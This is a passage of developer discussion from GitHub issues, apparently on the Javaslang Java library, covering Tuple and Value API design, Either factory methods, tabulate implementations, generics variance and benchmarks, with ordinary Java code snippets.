< n; i++) {\n        product *= k;\n        sum += product;\n    }\n    return sum;\n}\n```\n. Made some benchmarks.\nResult:\nalphabetic sequence using cartesian product bench(4) took 0.245 sec.\nalphabetic sequence using append self bench(4) took 0.032 sec.\nWe see that appendSelf() is great in reusing results which where calculated before.\nI think that the performance of appendSelf and cartesianPower should be nearly equal for a fixed dimension because no results need to be reduced.\nSetup:\n``` java\npublic class AlphabeticSequenceBench {\nprivate static final int COUNT = 4;\nprivate static final int WARMUP = 2;\n\nprivate static final Seq<Character> ALPHABET = CharSeq.rangeClosed('A', 'Z').toStream();\n\npublic static void main(String[] args) {\n    benchAlphabeticSequenceUsingCartesianPower();\n    benchAlphabeticSequenceUsingAppendSelf();\n}\n\nstatic void benchAlphabeticSequenceUsingCartesianPower() {\n    bench(\"alphabetic sequence using cartesian product\", COUNT, WARMUP, AlphabeticSequenceBench::cartesianPower);\n}\n\nstatic void benchAlphabeticSequenceUsingAppendSelf() {\n    bench(\"alphabetic sequence using append self\", COUNT, WARMUP, AlphabeticSequenceBench::appendSelf);\n}\n\nprivate static List<String> cartesianPower(int n) {\n    return Stream.from(1)\n            .flatMap(ALPHABET::crossProduct)\n            .map(IndexedSeq::mkString)\n            .takeWhile(s -> s.length() <= n)\n            .toList();\n}\n\nprivate static List<String> appendSelf(int n) {\n    return ALPHABET.sliding(1).toStream()\n            .appendSelf(stream -> stream.flatMap(product -> ALPHABET.map(product::append)))\n            .map(IndexedSeq::mkString)\n            .takeWhile(s -> s.length() <= n)\n            .toList();\n}\n\n}\n``\n. @lukaseder wanted to benchmark jOOL also, but it seemsSeq.range*()andSeq.crossJoin()` are not yet in Maven Central, right?\n. Ok. What I've seen so far is that java.util.stream.Stream is really fast. Looking forward to check how it performs.\n. Towards #592 \n. It would be an unequal comparison because trove4j, goldman-sachs and fast-util target special collections for primitive data types.\nJavaslang will target these when project valhalla (brian goetz) is released with the jdk.\n. We should compare with standard Java, Scala, ...\n. One 'feature' of Javaslang is, that the only dependency is the JDK. We intentionally keep the library small and clean.\n. Will be done in #725 \n. Many methods have currently zero usage because of missing unit-tests. We provide an API but don't use it ourself so far. It's ok!\nThe methods map, flatMap and filter are inherited from Value - the mother of most of Javaslang's types. (Side note: I decided to take the name 'value' because it reflects the core meaning of functional programming: thinking in (immutable) values and transformations of values.) Because our Try deals with exceptions by capturing failure state, it is great to have convenience methods if something goes wrong while (flat-)mapping or filtering results. The methods mapTry, filterTry and flatMapTry take checked functional interfaces, i.e. functional interfaces that throw checked exceptions.\nUnfortunately Java does not allow us to change the parameter type of map, ... to checked functions, so the best we can come up with is adding new methods mapTry, ...\n. Here is an example on how to access Failure.Fatal:\n``` java\n// import static ...Assertions.fail ...\ntry {\n    Try.of(() -> {\n        throw new UnknownError();\n    });\n    fail(\"Exception expected\");\n} catch(Failure.Fatal x) {\n    assertThat(x.toString()).isEqualTo(\"Fatal(java.lang.UnknownError)\");\n    // TODO: equals & hashCode\n}\n``\n. Nice work! Coverage is one of the last gaps towards a release 2.0.0. I like to go into the code again and rethink API from another perspective - like we've done it withmapTry`, ...\nI can merge if you want - or wait until you commit the Fatal.toString equals hashCode tests. Just give me a signal! :-)\n. Awesome!\n. Sorry @DillonJettCallis, I am really messy :) Added you to core library team now. Please find your invitation email...\n. @jasoet-gdp this a really great and thoughtful suggestion. Let's do it that way!\n. I described the new methodology on the main Javaslang organization page.\nAre there any volunteers for a javaslang-jackson module for serialization/deserialization of Javaslang classes?\n. Organization is running nicely now. People have write-access to sub-projects. Will close this ticket.\n. Many thanks!!\n. The automatic build trigger was fixed after authorizing travis-ci for the new javaslang github organization.\n. out of scope for Javaslang\n. Fixes #642 \nTowards #570, #428 \n. Thx :)\n. Great!\n. Sorry Lukas, I've overseen this one. My notification were turned off for weeks o_O\nThis. Sounds. Absolutely. Right.\nEntry should be removed.\n. @lukaseder what do you think - is it ok for the developers to have synonyms entry._1 for key and entry._2 for value?\nUpdate: It was a question to myself :-) I'm sure you already thought this through\n. But yes, I will do it. HashArrayMappedTrie also uses Tuples. Currently we have to convert the entries back and forth. Additionally tuples would nicely integrate, e.g. with HashMap.ofAll(list.zip(...)).\n. :-)\nthx for this issue - it was a good idea\n. @jbgi Would you also allow to create a Set view on a List? But Map view on List would clearly make no sense...\n. @johnmcclean-aol Yes, that would be a viable option.\nIn general, I think it is too much to define all possible views for each Javaslang collection (= number of Javaslang collections * number of Java collections). In a first step we could create a 1:1 dependecy, namely List to ListView, Set to SetView, ...\n. Martin Odersky wants to re-design Scala's views, as stated in a recent talk.\nHere is the corresponding issue: Wanted: Strawman proposals for new collections architecture\nDaniel Spiewak wrote down a first idea of redesigning Scala's collections in his Collections Redesign Proposal gist.\n. What about adding binarySearch to Seq (List, Stream, Vector, ...)?\n. It does not make sense to provide java.util Collection views. These are mutable. Javaslang collections are immutable. If we have a java.util.ListView listView on a javaslang.colleciton.List and call listView.add(x), nothing will happen to the view because the immutable change returns a new instace but java.util.List#add returns boolean.\n. Thanks, Ruslan! I will also ~~try~~ do my best to bring 2.0.0 'through the door' now... was busy with doing other thinks like reviewing chapters of a book, which is time-consuming. I target the 13.10.15 to make the jars available on maven central and publish the new (yet not existing) landing page at javaslang.com.\n. Ok, we will take our time. Then it will be after the 13th. Thx!!\n. Currently out-of-scope. We need to ship a major release.. thx!\n. To fix this issue we need to make copies of these methods with additional Comparator parameter:\nSortedMap transformations:\n- flatMap(BiFunction)\n- map(BiFunction)\nSortedSet transformations:\n- flatMap(Function)\n- map(Function)\n. Hi,\nthank you! Looks great. I made some slight changes similar to the collection conversion methods in Value, which look like this:\n``` java\n@Override\ndefault Set toSet() {\n    return ValueModule.toTraversable(this, HashSet.empty(), HashSet::of, HashSet::ofAll);\n}\n@Override\ndefault Stack toStack() {\n    return ValueModule.toTraversable(this, Stack.empty(), Stack::of, Stack::ofAll);\n}\n@Override\ndefault Stream toStream() {\n    return ValueModule.toTraversable(this, Stream.empty(), Stream::of, Stream::ofAll);\n}\n```\nwhere\njava\nstatic <T extends Traversable<V>, V> T toTraversable(Value<V> value, T empty,\n                                                     Function<V, T> ofElement,\n                                                     Function<java.lang.Iterable<V>, T> ofAll) {\n    if (value.isEmpty()) {\n        return empty;\n    } else if (value.isSingletonType()) {\n        return ofElement.apply(value.get());\n    } else {\n        return ofAll.apply(value);\n    }\n}\nWe could do s.th. similar. The methods then look like this (not tested yet):\n``` java\n// called by eager collections\nstatic , V> T tabulate(int n, Function<? super Integer, ? extends V> f, T empty, Function ofElement, Function ofArray) {\n    Objects.requireNonNull(f, \"f is null\");\n    if (n <= 0) {\n        return empty;\n    } else if (n == 1) {\n        return ofElement.apply(f.apply(1));\n    } else {\n        @SuppressWarnings(\"unchecked\")\n        V[] elements = (V[]) new Object[n];\n        for (int i = 0; i < n; i++) {\n            elements[i] = f.apply(i);\n        }\n        return ofArray.apply(elements);\n}\n// called by lazy collections\nstatic  Iterator tabulate(int n, Function<? super Integer, ? extends T> f) {\n    Objects.requireNonNull(f, \"f is null\");\n    if (n <= 0) {\n        return Iterator.empty();\n    } else {\n        return new AbstractIterator() {\n        int i = 0;\n\n        @Override\n        public boolean hasNext() {\n            return i < n;\n        }\n\n        @Override\n        protected T getNext() {\n            return f.apply(i++);\n        }\n    };\n}\n\n}\n```\nThe lazy version returns an Iterator instead of an Iterable to make it clear that it can be traversed only once.\n. @simonecarriero Hi, I've tested around a bit. Seems it works only if we add a component-type hint:\njava\n    static <C extends Traversable<T>, T> C tabulate(int n, Function<? super Integer, ? extends T> f, C empty, Function<T[], C> of, Class<?> componentType) {\n        Objects.requireNonNull(f, \"f is null\");\n        if (n <= 0) {\n            return empty;\n        } else {\n            @SuppressWarnings(\"unchecked\")\n            T[] elements = (T[]) java.lang.reflect.Array.newInstance(componentType, n);\n            for (int i = 0; i < n; i++) {\n                elements[i] = f.apply(i);\n            }\n            return of.apply(elements);\n        }\n    }\nUsage:\njava\n    @SuppressWarnings(\"unchecked\")\n    public static <K, V> HashMap<K, V> tabulate(Integer n, Function<? super Integer, ? extends Tuple2<? extends K, ? extends V>> f) {\n        return Collections.tabulate(n, (Function<? super Integer, ? extends Tuple2<K, V>>) f, HashMap.<K, V> empty(), HashMap::<K, V> ofEntries, Tuple2.class);\n    }\nHowever, this works only for types we already know, like Tuple2. If the type is a generic like T for Set, then we are not able to derive an instance of Class.\nI would suggest to keep the method as-is and use 'lazy'  tabulate method for HashMap that returns an Iterator.\nWhat do you think?\n. I ask myself why the cast works in javaslang.collection.Array#of(T) when T is a Tuple2:\njava\n@SuppressWarnings(\"unchecked\")\npublic static <T> Array<T> of(T element) {\n    return wrap((T[]) new Object[] { element });\n}\nbut #tabulate it produces an exception when T is Tuple2:\njava\n@SuppressWarnings(\"unchecked\")\nT[] elements = (T[]) new Object[n];\n/cc @ruslansennov \n@simonecarriero this might be also a problem for List.tabulate if T is Tuple2. Could you verify it, please?\n. thx @simonecarriero @ruslansennov  ok, it is good that all works for List, Array etc.\nThen let's take the tabulate method for HashMap that returns an Iterator, it is fine!\n. Thx!\n. @simonecarriero Thank you for implementing the methods and the tests! I think we are done now and can close the issue, right?\n. Yay! :+1: \n. Sounds nice! Have you a link for me to learn more about it?\n. Thx! An abstraction for Product would also make sense.\n. See also http://www.scalactic.org/user_guide/OrAndEvery mentioned by @mvh77 (who creates a Java port of it!)\n. @mvh77 Yes, really nice. I'm looking forward to play around with it...\n. This is obsolete because Either got a right-biased mode (see #882 and PR #1014).\nSee also Fixing scala.Either - unbiased vs biased and this Scala impl.\nI will close this for now. Please let me know if something is missing.\n. Hi, thx - great suggestion!\nSorry for the late answer. I just realized that I didn't watch my own project any more o_O and therefore received no notifications. Fixed that.\n. Could you also check, if Either behaves ok for you? The return types are slightly different than in Scala.\nIn Javaslang we stay in the projection when performing operations, in Scala we leave the projection and return to Left or Right. Subsequent operations need in Scala to project every time.\nWhat do you think which is better? The Scala behavior or the Javaslang behavior?\n. Need help! Two questions:\nYou see these...\njava\n    public <L, R> Either<L, R> right(R right) { return new Right<>(right); }\n    public <L, R> Either<L, R> left(L left) { return new Left<>(left); }\n...as static factory methods of interface Either, right? You suggest not to expose the specific type, like so, right?\njava\npublic interface Either<L, R> {\n    static <L, R> Right<L, R> right(R right) {\n        return new Right<>(right);\n    }\n    static <L, R> Left<L, R> left(L left) {\n        return new Left<>(left);\n    }\n}\nDo you have an example where it causes trouble regarding Java's type inference?\n\nThis way we can help the type inference allow to use in combinations with Option better.\n\nCould you please give me an example / combination with Option?\nNearly finished. Thx!\n. Ok. In a first step I will provide the factory methods.\nSounds like an interface Foldable also makes sense. Could be located as internal/auxiliary interface in Value, like FilterMonadic, Convertible, ... Then almost all types will get fold, not only Traversables.\n. left and right methods added. Other ideas are tracked in other issues.\nThx!\n. Here is a first implementation of Martin Odersky: https://github.com/lampepfl/dotty/blob/master/src/strawman/collections/CollectionStrawMan1.scala\n. Martin Odersky wants to re-design Scala's views, as stated in a recent talk.\nThe according dotty issue can be found here.\nThis Scala debate is a side-track of re-designing the collections: https://groups.google.com/forum/#!topic/scala-debate/Z1YH_0Hgu5A\nBill Venners slides presented at ScalaWorld 2015: http://www.slideshare.net/bvenners/collections-prettyslow\nDaniel Spiewak wrote down a first idea of redesigning Scala's collections in his Collections Redesign Proposal gist.\nLex Spoon's thoughts: http://blog.lexspoon.org/2015/10/initial-input-on-scala-collections.html\nPaul Phillips idea of bringing implicit methods into scope (e.g. map, flatten => flatMap): https://github.com/paulp/psp-std/blob/master/api/src/main/scala/Trait.scala\n. The discussion on the dotty Github repo has ended. The discussion now takes place here:\n- Scala Debate > Scope of redesigned collections\n- Mirror on QnaList (contains useful comments)\n. Beside discussion there has not been made much progress on this topic (my subjective view).\nSee https://groups.google.com/d/msg/scala-debate/Z1YH_0Hgu5A/ZsswMjg9BAAJ\nI will close this ticket for now. We will see if there is anything to do for us when a new Scala collection library is released. Until then we just observe...\n. See SCALA 2.13 COLLECTIONS REWORK. As said in #133, this is the current list of settings:\n- Code Style\n- File templates\n- Inspection profiles\n. Oh, just saw it :) Thx, Ruslan!\nI target a release candidate this weekend - we will see...\n. Seems the internet is down :) https://downdetector.com/status/google\n. HAHAHAAAAAAA!\n. restarted...\n. Epic: first time two Javaslang PRs build simultaneously :)\n. @lukaseder Hi Lukas, do you have a hint what might be faster when having thousands and thousands of calls? I'm not sure if a test would be meaningful if I just write some loops to measure it...\n``` java\nTree tree = ...\n// 1. create method call stack vs. compiler optimization (inlining)\ntree.getValue();\n// 2. cast + runtime type checking and field access\n((Node) tree).value\ninterface Tree {\n    T getValue();\n}\nclass Node implements Tree {\n    T value = ...;\n    T getValue() { return value; }\n}\n```\nUpdate: Inlining most probably makes no sense here because it is a field and not operations...\nUpdate 2: Of cause there has to be also some a tree instanceof Node before casting...\n. According to feedback (twitter poll) there should be no significant difference.\n. Nice, thx!\n. Addition to #113 \n. Thx, it is good to hear your view on that, I felt the same.\n. There will be some changes...\n1. Value.filter will return Option instead of throwing NoSuchElementException for some types, e.g. for Lazy, Either, ... and of cause Tuple. In general we should not build our API on behalf throwing exceptions. Instead we should provide a defined, algebraic return value in order to not break the control flow!\n2. In order to \"map a Tuple3 into a Tuple2\", as @ggalmazor suggested, we will rework our Tuple*.map methods. E.g. for Tuple2 it will look like this: <U extends Tuple<U>> U map(Function2<? super T1, ? super T2, U> f)\n3. The base interface Tuple needs a generic self-type in order to implement Value for each of Tuple* individually: interface Tuple<$ extends Tuple<$>> extends Value<$>\n. To resolve ambiguities, we will rename the map method mentioned above (in 2.) to transform():\njava\n// defined in class TupleN, for N = 0, ..., 8\n<U extends Tuple<U>> U transform(FunctionN<? super T1, ? super T2, ..., ? super TN, U> f)\n. The fact may lead to ambiguities, that (in my current prototype) Tuple<U extends Tuple<U>> is also of type Iterable<U>.\nFor example, the compiler can't decide which of the following Assertj methods it should use:\n- assertThat(T)\n- assertThat(Interable<T>)\n. After creating a prototype implementation and fiddling around one day, this does not feel right from the API perspective. Too many stumbling blocks.\nI will revert my changes and implement the lessons learned:\n- Implementations of Value.filter(Predicate) should return Option instead of throwing NoSuchElementException\n- Tuple needs a method <U extends Tuple<U>> U transform(Function<? super TupleN, U> f)\n. The new transform API allows us to write\njava\nTuple2<Integer, String> tuple = Tuple.of(1, \"2\");\nTuple3<Integer, Double, String> transform = tuple.transform(t -> Tuple.of(t._1, 3.1415, t._2));\nGiven transform() we have all the freedom we need to transform tuples. It would be great to have a general, abstract view on tuples as sequence of heterogenous values. But currently Java does not allow us to express this (in a practical way).\nMore specifically transform() is the general form of all (transforming) sequential operations, like split, take (aka limit), drop (aka split) et al.\n(Accessors like fold, reduce et al. are another story.)\nIMO it does not make much sense to implement sequential operations for tuples because the domain is finite, unless to sequences. More concrete, wlog (regarding tuple arity), an operation like flatten on a tuple of tuples is not possible because the domain is finite:\n// Meh! Tuple9 does not exist!\n((1, 2, 3, 4), (5, 6, 7, 8), (9)).flatten() = (1, 2, 3, 4, 5, 6, 7, 8, 9)\n/cc @lukaseder\n. Thanks for the feedback. You're right, it was not a good idea declaring recursive generics.\n\nWhat if I simply want to...\n\nYes, I recognized it, too. However, both of map and transform are needed.\n- map does map the components while preserving the 'container' Tuple*\n- transform may change the result type\nI think now all is fine. Thx for the review!!\n. I like images.\njava\ninterface M<T> {\n    <U> M<U> map(Function<? super T, ? extends U> f)\n}\ncan be seen like this:\nM<T> -- map --> M<U>\n get |               ^\n     v               | cons\n     T ----- f ----> U\nDescription of the arrows:\n- map() is a function of some M<T>. It uses an f to produce a M<U>\n- map() preserves the container type M\n- the mapper f maps a value of type T to a value of type U, where T and U are generic\nThe semantics is (spoken in code, without taking inheritance into account):\n``` java\ninterface M {\n<U> M<U> cons(U u);\n\nT get();\n\ndefault <U> M<U> map(Function<? super T, ? extends U> f) {\n    return cons(f.apply(get()));\n}\n\n}\n```\n. Correct, your example showed exactly this!\njava\ninterface Tuple2<T1, T2> {\n    <U1, U2> Tuple2<U1, U2> map(\n        Function<? super T1, ? extends U1> function,\n        Function<? super T2, ? extends U2> function\n    );\n}\nThe general form is\njava\n<U1, ..., UN> M<U1, ..., UN> map(\n    FunctionN<? super T1, ..., ? super TN, ? extends TupleN<U1, ..., UN> f);\n(In our example it is a coincidence that M = Tuple2 = return type of f.)\nOr component-wise, like in your example:\njava\n<U1, ..., UN> M<U1, ..., UN> map(\n    Function<? super T1, ? extends U1> f1,\n    ...,\n    Function<? super TN, ? extends UN> fn);\n. Yes, you are right, let me explain:\n\nBut what is the value of a Tuple? In my opinion, the value of a Tuple is the Tuple itself. This is different to all other Value types of Javaslang, which are always wrappers of values in some way (e.g. Option, List, ...).\n\nTuple is very special. I wanted it to extends my abstraction for values interface Value<T>. The point is that Value<T> has only one generic type parameter.\nThis implies for example that class Tuple2<T1, T2> implements Value<Tuple2<T1, T2>>. It was a technical thing, I wanted to have one abstraction for values in general - which we actually have in Javaslang!\nExamples:\n- interface Map<T, U> extends Value<Entry<T, U>> (indeed it is Traversable<Entry<T, U>>)\n- Either's RightProjection<L, R> is a Value<R>, Either's LeftProjection<L, R> is a Value<L>\n- and so on...\nDoes this sound reasonable?\n. At the long end, this led to the recursive declaration Tuple<U extends Tuple<U>> to have common methods in the base interface Tuple and to get the return types right.\nAnd that led to ambiguities which are a no-go for a user-friendly API.\n. Oh, cool! Here we have an article :-)\n. The <U extends Tuple<U>> reflects the recursive nature I mentioned above...\n. I was confused by myself. Then I delete code and all is fine again :-)\n. At least some of the Value interdace methods should be supported by Tuple.\nEither we split the Value interface into separated interfaces (Convertible, Monadic, ....) or we find a way to let Tuple implement Value (better solution).\nTuple could be a Value by\n- taking only the first component into account (Tuple0 = empty)\n- using a recursive type approach\n- letting TupleN classes implement Value instead of letting the Tuple interface extending Value\n- ...\n. Tuples as collections of elements\nWhen treating a Tuple as collection of elements, it is helpful if the component types are homogenous. See https://hackage.haskell.org/package/tuples-homogenous-h98-0.1.1.0/docs/Data-Tuple-Homogenous.html.\nIf the components are not homogenous, the best we can do is to treat them as Objects.\nTuples as composite objects\nThis viewpoint is already described above - the value of a tuple is the tuple itself.\n. The biggest problem of implementing Tuples as collections of elements is ... the map method.\nStarting with interface Tuple extends Value<Object> leads to\n``` java\n// Tuple0: Error / incompatible return type\n Tuple0 map(Function<? super Object, ? extends U> mapper);\n// Tuple1: ok!\n Tuple1 map(Function<? super Object, ? extends U> mapper);\n// Tuple2: Error / incompatible return type\n Tuple2 map(Function<? super Object, ? extends U> mapper);\n```\nTo address the 'incompatible return type'  issue, we may introduce a generic bound type parameter B:\njava\ninterface Tuple<B> extends Value<B> {\n}\nThis makes it even worse:\n``` java\n// Tuple0 extends Value: ok, but instead of Object it should be any type\n Tuple0 map(Function<? super Object, ? extends U> mapper);\n// Tuple1 extends Value: ok!\n Tuple1 map(Function<? super Object, ? extends U> mapper);\n// Tuple2 extends Value (should be lower bound of T1, T2):\n// Error / incompatible return type\n Tuple2 map(Function<? super Object, ? extends U> mapper);\n```\nWhen we change the return type of map(Function) from TupleN to Value<U>, the only remaining problem with interface Tuple extends Value<Object> is an ambiguity regarding Tuple1.map(Function) and Tuple1.map(Function1):\n``` java\n Tuple1 map(Function1<? super T1, ? extends U1> f);\n Value map(Function<? super Object, ? extends U> mapper)\n// ambiguous!\nmap(o -> o)\n```\nConclusion:\n- We need to provide a type hint interface Tuple<T> extends Value<T>, in order to fix the Tuple1 map issue\n- With a type hint, we have a problem to let return map a homogenous TupleN<U, ..., U>\nNo solution here for that, yet...\n. This would (probably) work:\n- Tuple gets an additional type parameter interface Tuple<B> extends Value<B>\n- Tuple0 could implement Tuple (unchecked)\n- Tuple1<T1> could implement Tuple<T1>\n- TupleN could implement Tuple (unchecked)\nCons:\n- Tuple has additional type parameter\n- Only Tuple1 can make use of this type parameter, Tuple0, Tuple2, ... need to implement unchecked methods without generics\nConclusion:\nThe cons mentioned above sound like an evil hack. Instead, we should implement only some of the Value interfaces and exclude FilterMonadic. In particular we implement:\n- javaslang.Iterable\n- Convertible\n- Printable\nThese interfaces should be internal and just a mechanism to organize things a bit and share common interfaces between tuples and values.\n. Should 'non-monadic' Values have a name?\nE.g.\n- javaslang.Object\n- SemiValue\n- HalfValue\n- Non / NonValue / NonMonadicValue\n- AntiValue\n- VirtualValue\n- CompositeValue\n- AbstractValue\n- ...\nwith\n``` java\npackage javaslang;\n// maybe internal?\ninterface Obj extends javaslang.Iterable, Convertible, Printable, ... {\n}\ninterface Value extends Obj, FilterMonadic, ... {\n}\n```\nIt is just for Tuples. Maybe it is sufficient not to abstract over this special case and just let Tuple implement the interfaces Convertable, Printable, etc.\n. :+1: \n. I had an Idea - it is:\n- rename javaslang.Iterable to javaslang.Immutable.\n- let Immutable additionally extend Convertible and Printable\n- let Tuple extends Immutable\n- let Value extends Immutable and FilterMonadic\nAdditionally move sliding et. al. from Iterable to TraversableOnce. These operations should not be part of each Value.\n. A prototypical implementation showed, that it is not a good idea to let Tuple implement Iterable. It led to ambiguities when throwing a tuple into one of two methods:\njava\nvoid m(T);\nvoid m(Iterable<T>);\nTuple now has toSeq() which is sufficient for now.\n. Thx! I will sync take a look at Future and Promise today and will then also put more focus on tests. Tuesday I target a first Release Candidate...\n. @DillonJettCallis Please note, all is ok with javaslang.concurrent - I am busy with embedding Future into the Javaslang type hierarchy (implement Value) and with doing additional tests. We provide now a beta version. The concurrent package will be available soon in the first RC version.\nGreets,\nDaniel\n. Thx! I also recognized it :) Will merge it after I pulled the new javadoc auto-deployment...\n. Great, thx!!\n. Links:\n- Recent vJug talk by Raoul-Gabriel Urma and Richard Warburton: Generics: Past, Present and Future\n- And a paper about Adoption and use of Java generics\n. - Clearly we have to declare the variance (? extends, ? super) of our collection types\n- Currently Javaslang declares the variance property at the use-site (read: at the methods)\n- In a future version of Java we may declare the variance property also at the declaration-site (read: at the class)\nExample:\n``` java\ninterface Set extends Traversable {\nSet<T> union(Set<? extends T> that);\n\n// Returns an optional initial subtype of Set.\n@Override\nOption<? extends Set<T>> initOption();\n\n@Override\n<U> Set<U> map(Function<? super T, ? extends U> mapper);\n\n}\n// A requirement of sorted collections is\n// to have an underlying element Comparator.\ninterface SortedSet extends Set {\n// We can't change the parameter type\n//     union(SortedSet<? extends T> elements);\n// because it wouldn't override the super classes method any more.\n@Override\nSortedSet<T> union(Set<? extends T> elements);\n\n// We are able to return an initial SortedSet here\n// instead of an initial Set because we used\n// ? extends Set in the Set interface\n@Override\nOption<? extends SortedSet<T>> initOption();\n\n// The right way would be to declare U as follows:\n//      <U extends Comparable<? super U>>\n// But Java does not allow this kind of ristriction of generic type parameters.\n@Override\n<U> SortedSet<U> map(Function<? super T, ? extends U> mapper);\n\n// It is sufficient to provide the Comparator explicitely\n// instead of having U extends Comparable.\n<U> SortedSet<U> map(Comparator<? super U> comparator, Function<? super T, ? extends U> mapper);\n\n}\n// We make TreeSet final in order to make some return types final.\n// Example: initOption() returns Option> instead of Option<? extends TreeSet>.\npublic final class TreeSet implements SortedSet {\n@Override\npublic TreeSet<T> union(Set<? extends T> elements) {\n}\n\n// We simplify the API by fixating the return type.\n// It is possible to do so because TreeSet is final.\n@Override\npublic Option<TreeSet<T>> initOption() {\n    return ...;\n}\n\n// Sample here as in SortedSet - <U> actually would have to be\n//     <U extends Comparable<? super U>>\n@Override\npublic <U> TreeSet<U> map(Function<? super T, ? extends U> mapper) {\n    return ...;\n}\n\n@Override\npublic <U> TreeSet<U> map(Comparator<? super U> comparator, Function<? super T, ? extends U> mapper) {\n    return ...;\n}\n\n}\n``\n. I'm tempted to allow further inheritance, i.e. by makingTreeSet` (see example above) not final.\nThis would require to adjust the return types of all final classes:\n``` java\n// before\npublic Option> initOption() { ... }\n// after\npublic Option<? extends TreeSet> initOption() { ... }\n```\nHowever, there are collection types like List, Stream and Stack which are interfaces. List for example has two implementations: Cons and Nil. It would not make much sense to allow users to extends these in order to create a user-defined subtype of List.\nA linked List looks like this:\njava\n// List(1, 2, 3) = Cons(1, Cons(2, Cons(3, Nil)))\nImagine we wanted to create a subtype of List:\njava\ninterface PeopleList extends List<Person> {\n    ...\n}\nThen also Cons and Nil would be needed to be extended:\n``` java\nclass PeopleCons extends List.Cons implements PeopleList {\n    ...\n}\nclass PeopleNil extends List.Nil implements PeopleList {\n    ...\n}\n```\nBut this won't help much when looking at methods like initOption(). The return types would have to be adjusted in order to make subtyping List make sense:\n``` java\ninterface PeopleList extends List {\n    @Override\n    Option initOption();\n}\nclass PeopleCons extends List.Cons implements PeopleList {\n// can't use List.Cons.initOption() here ...\n@Override\npublic Option<PeopleList> initOption() {\n    // ...\n}\n\n}\n```\nTherefore the List interface would have to be fully implemented by subtypes.\nThe same applies for other types, like HashMap. A subset of the methods would have to be implemented by subtypes in order to get the return types right (see initOption()).\nNote: Because of the above the List interface may have only one implementation. Therefore the return types are restricted, e.g. Option<List<T>> instead of Option<? extends List>`.\nAny ideas on that. Does this make sense? How would an API look like that allows further inheritance of collections?\n. From my current viewpoint, the generic type declarations are correct. It is ok to have some sort of terminal generics, like in List, Seq, etc. (as mentioned above). It is typical for values in a functional environment not to be further extended. We see this when looking at value classes (aka Scala's case classes).\n. Seems that Eclipse formatter F$%&*CK3D up the whole formatting... But I don't mind - it's only code.\nWe will find a better format.\n. Hi, I was two days offline (in Munich)...\nIt is good that we got rid of result() because it was used only in Tree. However, the new IterableAssert and ObjectAssert introduce a little background magic. But it works well and is ok.\nThx!\n. Our collections are well-know and well-understood for decades now. Most probably there will not be much change regarding new collection types.\n. Thanks. A few months ago I wrote Kind as semi-higher order type abstraction and then removed it from the project. It may re-appear when creating a project javaslang-pure, which will be a thin, algebraic abstraction layer above javaslang.\n. Higher order types as we know them from other languages, like Scala, are not possible in Java.\nWe already investigated the Kind type in Javaslang. But from my currently viewpoint it is still only a partial workaround which clutters the API a lot. Therefore I will close this ticket.\nPlease let me know if I missed s.th. or give me more details on how to bring this feature into Java/Javaslang.\n. Moved from #748 to here:\nFuture.sequence()\njava\nStream.from(1)                                   // Stream(1, 2, 3, ...)\n        .map(i -> Future.of(() -> getPerson(i))) // Stream(Future<Person>, Future<Person>, ...)\n        .transform(Future::sequence)             // Future<Seq<Person>>\nList.flatten()\n``` java\nList.of(1, 2, 3)                   // = List(1, 2, 3)\n        .map(i -> List.of(i, i))   // = List(List(1, 1), List(2, 2), List(3, 3))\n        .transform(List::flatten); // = List(1, 1, 2, 2, 3, 3)\n// with...\ninterface List {\n     List flatten(Iterable<? extends Iterable<? extends T>> that) {\n        return List.ofAll(that).flatMap(Function.identity());\n    }\n}\n``\n. Can't handle this until 2.0.0. Will move this to 2.0.1 which will come soon after...\n. We need a self-type U transform(Function<? super SELF_TYPE, ? extends U>)` in order to make this method inheritance compatible. This is not possible with Java except we add a generic type variable SELF_TYPE to all interfaces, which will not happen!\nTherefore we will select the types that give us most value when adding the transform method.\nIn particular we will add transform to these Traversables:\n- Seq: <U> U transform(Function<? super Seq<? super T>, ? extends U>)\n- Set: <U> U transform(Function<? super Set<? super T>, ? extends U>)\n- Map: <U> U transform(Function<? super Map<? super K, ? super V>, ? extends U>)\n- Tree: <U> U transform(Function<? super Tree<? super T>, ? extends U>)\n- Iterator: <U> U transform(Function<? super Iterator<? super T>, ? extends U>)\nAnd we add transform to these single-valued Values:\n- Future: <U> U transform(Function<? super Future<? super T>, ? extends U>)\n- Match.MatchMonad: <U> U transform(Function<? super MatchMonad<? super T>, ? extends U>)\n- Lazy: <U> U transform(Function<? super Lazy<? super T>, ? extends U>)\n- Either.LeftProjection: <U> U transform(Function<? super LeftProjection<? super T>, ? extends U>)\n- Either.RightProjection: <U> U transform(Function<? super RightProjection<? super T>, ? extends U>)\n- Option: <U> U transform(Function<? super Option<? super T>, ? extends U>)\n- Try: <U> U transform(Function<? super Try<? super T>, ? extends U>)\n- Arbitrary: <U> U transform(Function<? super Arbitrary<? super T>, ? extends U>)\n- Gen: <U> U transform(Function<? super Gen<? super T>, ? extends U>)\n. Hi Ruslan,\nwe should find a general way to do it. I re-opened #692 and will work on it.\nPlease keep this PR open until we see in which direction #692 evolves.\nGreets\nDaniel\n. I fiddled around for hours just to learn (again) that there is no good way to let extend Tuple the Iterable interface. Also inheriting other methods is overkill.\nI committed an impl of the Tuple.toSeq method (which I regret now because of the merge conflicts). Could you please commit your tests for that method? I think the simplest way is to copy your tuples test of the Generator.scala to a fresh copy of master...\nThanks for your patience with me!\n. thx!!\n. I'm not sure, if it is a good idea to mix old and new Match API, even if the old is deprecated. Maybe it is better to remove the old caze syntax completely.\nExtra functions for primitive types will not be re-added. Maybe we have primitive generics starting with Java 9...\n. People already start to adopt 2.0.0-*. It's not worth the effort to create a migration guide. Instead we should invest into more mature documentation.\n. done\n. Investigating it showed, that I first also got the IntelliJ compile error, but then (after issuing a mvn compile) on the command line, the IDE errors magically disappeared. Then I pressed the 'make project' button - and the errors still did not appear again.\nHere is the test code:\n``` java\npublic class Test {\npublic void toList(String... someStrings) {\n    List<String> theList1 = List.<String>of(someStrings);\n    List<String> theList2 = List.of(someStrings);\n}\n\n}\n```\nAlso the extra <String> arg is recognized by IntelliJ as unnecessary. I think there is nothing to do. If IntelliJ says, there is an error while javac compiles fine, it seems to be an IntelliJ bug.\n. I like the idea to use ofAll(T...) instead of of(T...) because it looks more consistent.\nHistory\nThe idea behind of(T) and of(T...) was to do it 'the Java way'. I did take a look at the java.util.stream.Stream API. There we have these methods:\n- Stream.of(T)\n- Stream.of(T...)\nI didn't understood, why there is the of(T) method, because it is a special case of of(T...), using just one argument. Here is a diskussion with Lukas Eder: https://github.com/jOOQ/jOOL/issues/89\nIt seems, that we have Stream.of(T) for the null case, because the null array is/should be not a valid varargs argument.\nNext steps\nIf no one is shouting out loud, I 